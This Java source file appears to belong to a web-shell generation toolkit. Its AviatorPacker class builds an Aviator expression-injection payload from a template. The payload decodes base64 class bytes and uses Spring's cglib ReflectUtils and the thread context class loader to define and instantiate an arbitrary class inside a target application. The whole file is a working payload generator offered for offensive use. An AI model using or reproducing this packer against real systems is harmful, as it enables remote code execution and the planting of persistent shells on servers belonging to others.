package com.reajason.javaweb.packer.aviator;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.Util;
import org.kohsuke.MetaInfServices;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.Aviator, order = 1100)
public class AviatorPacker implements Packer {
    String template = "use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.newInstance(ReflectUtils.defineClass('{{className}}', Base64Utils.decodeFromString('{{base64Str}}'), ReflectionUtils.invokeMethod(ClassUtils.getMethod(Class.forName('java.lang.Thread'), 'getContextClassLoader', nil), Thread.currentThread())));";

    @Override
    public String pack(ClassPackerConfig config) {
        return template.replace("{{className}}", config.getClassName())
                .replace("'{{base64Str}}'", Util.toSingleQuotedConcatLiteral(config.getClassBytesBase64Str()));
    }
}
